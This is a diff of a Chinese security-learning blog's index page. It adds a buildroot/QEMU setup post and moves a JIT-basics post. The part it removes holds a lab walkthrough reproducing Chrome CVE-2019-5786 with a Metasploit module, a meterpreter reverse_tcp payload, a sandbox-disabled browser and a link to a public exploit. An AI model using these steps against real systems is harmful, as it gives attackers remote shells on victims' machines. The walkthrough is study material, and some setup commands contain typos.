@@ -202,7 +202,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 16.67px;">chrome_bug</a> <a href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 13.33px;">chrome调试</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/tags/%E3%80%8A0-Day%E5%AE%89%E5%85%A8%E3%80%8B/" style="font-size: 10px;">《0 Day安全》</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 13.33px;">漏洞战争</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
+                        <a href="/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/bp/" style="font-size: 10px;">bp</a> <a href="/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 16.67px;">chrome_bug</a> <a href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 13.33px;">chrome调试</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/tags/%E3%80%8A0-Day%E5%AE%89%E5%85%A8%E3%80%8B/" style="font-size: 10px;">《0 Day安全》</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 10px;">漏洞战争</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
                     </div>
                 </section>
                 
@@ -294,6 +294,100 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-Ubuntu下buildroot以及qemu环境搭建" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="article-date">
+      <time datetime="2020-10-16T04:29:57.335Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">Ubuntu下buildroot以及qemu环境搭建</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="0x00-搭建环境"><a href="#0x00-搭建环境" class="headerlink" title="0x00 搭建环境"></a>0x00 搭建环境</h1><p>windows 10<br>VMwareWorkstation pro<br>Ubuntu 16.04 x64</p>
+<h1 id="0x01-安装binwalk"><a href="#0x01-安装binwalk" class="headerlink" title="0x01 安装binwalk"></a>0x01 安装binwalk</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">sudo apt-get remove binwalk</span><br><span class="line">sudo spt-get update</span><br><span class="line">sudo apt-get install build-essential autoconf git &#x2F;&#x2F;获取Git</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;devttys0&#x2F;binwalk</span><br><span class="line">cd binwalk</span><br><span class="line">sudo python setup.py install</span><br><span class="line">sudo .&#x2F;deps.sh</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-安装buildroot交叉编译环境"><a href="#0x02-安装buildroot交叉编译环境" class="headerlink" title="0x02 安装buildroot交叉编译环境"></a>0x02 安装buildroot交叉编译环境</h1><p>安装依赖：</p>
+<p><code>sudo apt-get install libncurses5-dev patch</code></p>
+<p>下载buildroot:</p>
+<p><code>wget https://buildroot.org/downloads/buildroot-2020.02.6.tar.gz</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf buildroot-2020.02.6.tar.gz</span><br><span class="line">cd buildroot-2020.02.6</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
+
+<p>出现配置界面：</p>
+<ul>
+<li>选择target options-&gt;target Architecture-&gt;MIPS(Little endian),代表MIPS小端序</li>
+<li>在toolChain–&gt;Kelnel Headers,选择自己主机内核版本或更低版本。</li>
+<li>保存退出</li>
+</ul>
+<p><code>sudo make</code></p>
+<p>静等完成。</p>
+<p>os：编译的时候需要大内存，我分配个虚拟机的内存太小，导致编译失败了好几次……此处多谢Prowes5帮我找到了原因呜呜呜。</p>
+<p>测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;mipsel-linux-gcc hello.c -o hello</span><br><span class="line">.&#x2F;hello &#x2F;&#x2F;失败</span><br></pre></td></tr></table></figure>
+
+<p>使用file查看，是小端序的mips程序。</p>
+<h1 id="0x03-qemu运行环境"><a href="#0x03-qemu运行环境" class="headerlink" title="0x03 qemu运行环境"></a>0x03 qemu运行环境</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu</span><br><span class="line">sudo apt-get install qemu-user-static</span><br></pre></td></tr></table></figure>
+
+<p>测试hello报错<code>/lib/ld-uClibc.so.0: No such file or directory</code></p>
+<p>是因为没有对应架构的链接库的问题<br>在目录output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/下，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo cp ld-uClibc-1.0.32.so &#x2F;lib&#x2F;</span><br><span class="line">sudo chown -R root:root &#x2F;lib&#x2F;ld-uClibc-1.0.31.so</span><br><span class="line">sudo ln -s &#x2F;lib&#x2F;ld-uClibc-1.0.32.so &#x2F;lib&#x2F;ld-uClibc.so.0</span><br></pre></td></tr></table></figure>
+
+<p>还是不行，cd /lib目录下，删掉了原来的ld-uClibc.so.0文件，然后重新输入命令。</p>
+<p>出现新报错：<code>/home/test/buildroot-2019.02.4/hello: can&#39;t load library &#39;libc.so.0&#39;</code></p>
+<p>解决方案：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo cp libuClibc-1.0.31.so &#x2F;lib&#x2F;</span><br><span class="line">sudo chown -R root:root &#x2F;lib&#x2F;libuClibc-1.0.32.so</span><br><span class="line">sudo ln -s &#x2F;lib&#x2F;libuClibc-1.0.32.so &#x2F;lib&#x2F;libc.so.0</span><br></pre></td></tr></table></figure>
+
+<p>还是出现了文件不对应问题，cd /lib下删掉了原来的libc.so.0文件，继续重新输入命令。</p>
+<p>运行成功。</p>
+<p>os:为了找到出错点，我真是已经切换目录切换到全都背下来了……真的是一搭环境总会碰到所有的问题……霉霉本霉了。</p>
+<h1 id="0x04-配置网络环境"><a href="#0x04-配置网络环境" class="headerlink" title="0x04 配置网络环境"></a>0x04 配置网络环境</h1>
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-SQL学习与整理" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -779,6 +873,78 @@
 
 
   
+    <article id="post-JIT学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/JIT%E5%AD%A6%E4%B9%A0/" class="article-date">
+      <time datetime="2020-10-16T04:29:57.272Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/JIT%E5%AD%A6%E4%B9%A0/">JIT学习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="JIT原理"><a href="#JIT原理" class="headerlink" title="JIT原理"></a>JIT原理</h2><p>Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。</p>
+<p>还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。</p>
+<h2 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h2><p>从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。</p>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> #include&lt;stdio.h&gt;</span><br><span class="line">int inc(int a) &#123;</span><br><span class="line">    return a + 1;</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;%d\n&quot;, inc(3));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>objdump -d 1</code>查看它的机器码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0000000000400526 &lt;inc&gt;:</span><br><span class="line">  400526:	55                   	push   %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器</span><br><span class="line">  400527:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">  40052a:	89 7d fc             	mov    %edi,-0x4(%rbp)#把edi存到栈上。在x64处理器上，前6个参数都是使用寄存器传参的。第一个参数会使用rdi，第二个参数使用 rsi，等等。所以 edi 里存的其实就是第一个参数，也就是整数 3</span><br><span class="line">  40052d:	8b 45 fc             	mov    -0x4(%rbp),%eax#把上一步存到栈上的那个整数再存进 eax 中</span><br><span class="line">  400530:	83 c0 01             	add    $0x1,%eax#把 eax 加上 1， 然后就退栈，返回。按照x64的规定（ABI），返回值通过eax传递</span><br><span class="line">  400533:	5d                   	pop    %rbp</span><br><span class="line">  400534:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> #include&lt;stdio.h&gt;</span><br><span class="line"> #include&lt;memory.h&gt;</span><br><span class="line"> #include&lt;sys&#x2F;mman.h&gt;</span><br><span class="line">typedef int (* inc_func)(int a); </span><br><span class="line">int main() &#123;</span><br><span class="line">    char code[] &#x3D; &#123; </span><br><span class="line">        0x55,             &#x2F;&#x2F; push rbp</span><br><span class="line">        0x48, 0x89, 0xe5, &#x2F;&#x2F; mov rsp, rbp</span><br><span class="line">        0x89, 0xf8,       &#x2F;&#x2F; mov edi, eax</span><br><span class="line">        0x83, 0xc0, 0x01, &#x2F;&#x2F; add $1, eax</span><br><span class="line">        0x5d,             &#x2F;&#x2F; pop rbp</span><br><span class="line">        0xc3              &#x2F;&#x2F; ret</span><br><span class="line">    &#125;;  </span><br><span class="line">    void * temp &#x3D; mmap(NULL, sizeof(code), PROT_WRITE | PROT_EXEC,</span><br><span class="line">            MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); </span><br><span class="line">    memcpy(temp, code, sizeof(code));</span><br><span class="line">    inc_func p_inc &#x3D; (inc_func)temp;</span><br><span class="line">    printf(&quot;%d\n&quot;, p_inc(7));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。</p>
+<p>我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">chrome知识点</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-Dlink-Dir-823G路由器漏洞挖掘过程" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -871,78 +1037,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-JIT学习" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/10/16/JIT%E5%AD%A6%E4%B9%A0/" class="article-date">
-      <time datetime="2020-10-16T04:29:57.272Z" itemprop="datePublished">2020-10-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/16/JIT%E5%AD%A6%E4%B9%A0/">JIT学习</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="JIT原理"><a href="#JIT原理" class="headerlink" title="JIT原理"></a>JIT原理</h2><p>Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。</p>
-<p>还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。</p>
-<h2 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h2><p>从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。</p>
-<p>例子：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> #include&lt;stdio.h&gt;</span><br><span class="line">int inc(int a) &#123;</span><br><span class="line">    return a + 1;</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;%d\n&quot;, inc(3));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>objdump -d 1</code>查看它的机器码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0000000000400526 &lt;inc&gt;:</span><br><span class="line">  400526:	55                   	push   %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器</span><br><span class="line">  400527:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">  40052a:	89 7d fc             	mov    %edi,-0x4(%rbp)#把edi存到栈上。在x64处理器上，前6个参数都是使用寄存器传参的。第一个参数会使用rdi，第二个参数使用 rsi，等等。所以 edi 里存的其实就是第一个参数，也就是整数 3</span><br><span class="line">  40052d:	8b 45 fc             	mov    -0x4(%rbp),%eax#把上一步存到栈上的那个整数再存进 eax 中</span><br><span class="line">  400530:	83 c0 01             	add    $0x1,%eax#把 eax 加上 1， 然后就退栈，返回。按照x64的规定（ABI），返回值通过eax传递</span><br><span class="line">  400533:	5d                   	pop    %rbp</span><br><span class="line">  400534:	c3                   	retq</span><br></pre></td></tr></table></figure>
-
-<p>我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> #include&lt;stdio.h&gt;</span><br><span class="line"> #include&lt;memory.h&gt;</span><br><span class="line"> #include&lt;sys&#x2F;mman.h&gt;</span><br><span class="line">typedef int (* inc_func)(int a); </span><br><span class="line">int main() &#123;</span><br><span class="line">    char code[] &#x3D; &#123; </span><br><span class="line">        0x55,             &#x2F;&#x2F; push rbp</span><br><span class="line">        0x48, 0x89, 0xe5, &#x2F;&#x2F; mov rsp, rbp</span><br><span class="line">        0x89, 0xf8,       &#x2F;&#x2F; mov edi, eax</span><br><span class="line">        0x83, 0xc0, 0x01, &#x2F;&#x2F; add $1, eax</span><br><span class="line">        0x5d,             &#x2F;&#x2F; pop rbp</span><br><span class="line">        0xc3              &#x2F;&#x2F; ret</span><br><span class="line">    &#125;;  </span><br><span class="line">    void * temp &#x3D; mmap(NULL, sizeof(code), PROT_WRITE | PROT_EXEC,</span><br><span class="line">            MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); </span><br><span class="line">    memcpy(temp, code, sizeof(code));</span><br><span class="line">    inc_func p_inc &#x3D; (inc_func)temp;</span><br><span class="line">    printf(&quot;%d\n&quot;, p_inc(7));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。</p>
-<p>我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">chrome知识点</a></li></ul>
     </div>
 
       
@@ -1074,125 +1168,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome%E8%B0%83%E8%AF%95/" rel="tag">chrome调试</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-CVE-2019-5786" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/10/16/CVE-2019-5786/" class="article-date">
-      <time datetime="2020-10-16T04:29:57.219Z" itemprop="datePublished">2020-10-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/16/CVE-2019-5786/">CVE-2019-5786</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>前言：</p>
-<p>这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！</p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali<br>win7_x86<br>Google_chrome_(32bit)_v72.0.3626.119</p>
-<p>浏览下载链接推荐：<a href="https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe" target="_blank" rel="noopener">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p>
-<h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)</p>
-<p><code>root@kali:~# msfconsole -q</code></p>
-<p><code>msf5 &gt; search chrome_filereader</code></p>
-<blockquote>
-<p>注：<br>1.<code>msfconsole -q</code>  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索exp。exp存在则浮现。<br>3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”</p>
-</blockquote>
-<p>出现exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p>
-<p><img src="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png" alt="捕获.PNG"></p>
-<h3 id="简单了解FileReader对象的用法"><a href="#简单了解FileReader对象的用法" class="headerlink" title="简单了解FileReader对象的用法"></a>简单了解FileReader对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p>
-<ul>
-<li><p>readyState：表示读取状态</p>
-<ul>
-<li>empty,0,尚未读取</li>
-<li>loading,1,正在读取</li>
-<li>done,2,读取完成</li>
-</ul>
-</li>
-<li><p>result：表示读取结果，具体格式与读取方式有关：</p>
-<ul>
-<li>readAsArrayBuffer</li>
-<li>readAsBinaryString</li>
-<li>readAsDataURL</li>
-<li>readAsText</li>
-</ul>
-</li>
-<li><p>onprogress：回调函数</p>
-<ul>
-<li>读取Blob触发</li>
-<li>当数据较多时会周期性触发多次</li>
-</ul>
-</li>
-<li><p>onloadend：回调函数</p>
-<ul>
-<li>读取操作完成时触发，不论读取成功或失败</li>
-</ul>
-</li>
-</ul>
-<p>查看模块信息</p>
-<p><img src="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png" alt="捕获.PNG"></p>
-<p>漏洞介绍：</p>
-<figure class="highlight plain"><figcaption><span>information:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line">  This exploit takes advantage of a use after free vulnerability in </span><br><span class="line">  Google Chrome 72.0.3626.119 running on Windows 7 x86. The </span><br><span class="line">  FileReader.readAsArrayBuffer function can return multiple references </span><br><span class="line">  to the same ArrayBuffer object, which can be freed and overwritten </span><br><span class="line">  with sprayed objects. The dangling ArrayBuffer reference can be used </span><br><span class="line">  to access the sprayed objects, allowing arbitrary memory access from </span><br><span class="line">  Javascript. This is used to write and execute shellcode in a </span><br><span class="line">  WebAssembly object. The shellcode is executed within the Chrome </span><br><span class="line">  sandbox, so you must explicitly disable the sandbox for the payload </span><br><span class="line">  to be successful.</span><br></pre></td></tr></table></figure>
-
-<p>选择payload<br><code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p>
-<blockquote>
-<p>注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”</p>
-</blockquote>
-<p>设置payload参数：LHOST为kali ip<br><code>-&gt; set LHOST 192.168.119.128</code></p>
-<p><img src="https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png" alt="捕获.PNG"></p>
-<p>创建服务 <code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p>
-<p><img src="https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png" alt="捕获.PNG"></p>
-<p>启动服务：run 或者exploit</p>
-<p>在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe<br><code>-&gt; chrome.exe --no-sandbox</code></p>
-<p>在弹出的chome浏览器中访问kali ip:<br><a href="http://192.168.119.128:8080" target="_blank" rel="noopener">http://192.168.119.128:8080</a></p>
-<p>kali获得sessions<br>查看sessions序号，通过反弹shell在win7上可执行命令。<br>复现结束。</p>
-<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.<br>虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。</p>
-<p><a href="https://github.com/exodusintel/CVE-2019-5786" target="_blank" rel="noopener">https://github.com/exodusintel/CVE-2019-5786</a> </p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome-bug/" rel="tag">chrome_bug</a></li></ul>
     </div>
 
       
